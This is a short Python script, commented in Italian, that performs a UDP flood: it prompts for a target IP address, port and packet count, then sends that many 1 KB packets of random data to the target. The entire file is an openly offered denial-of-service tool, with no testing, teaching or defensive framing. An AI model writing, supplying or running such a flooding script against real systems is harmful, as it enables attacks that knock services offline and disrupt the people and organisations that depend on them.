import socket
import random

def udp_flood(target_ip, target_port,packet_size, num_packets):
    # Creazione del socket UDP                                                  
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Generazione dei dati casuali di 1 KB per il pacchetto                     
    packet_data = bytearray(random.getrandbits(8) for _ in range(packet_size))

    # Invio dei pacchetti                                                       
    for _ in range(num_packets):
        udp_socket.sendto(packet_data, (target_ip, target_port))

    # Chiusura del socket                                                       
    udp_socket.close()
    print(f"UDP flood completato! {num_packets} pacchetti da {packet_size} byte\
 inviati a {target_ip}:{target_port}")

def main():
    target_ip = input("Inserisci l'IP del target: ")
    target_port = int(input("Inserisci la porta del target: "))
    packet_size = 1024 # 1 KB                                                   
    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))

    udp_flood(target_ip, target_port, packet_size, num_packets)

if __name__ == "__main__":
    main()
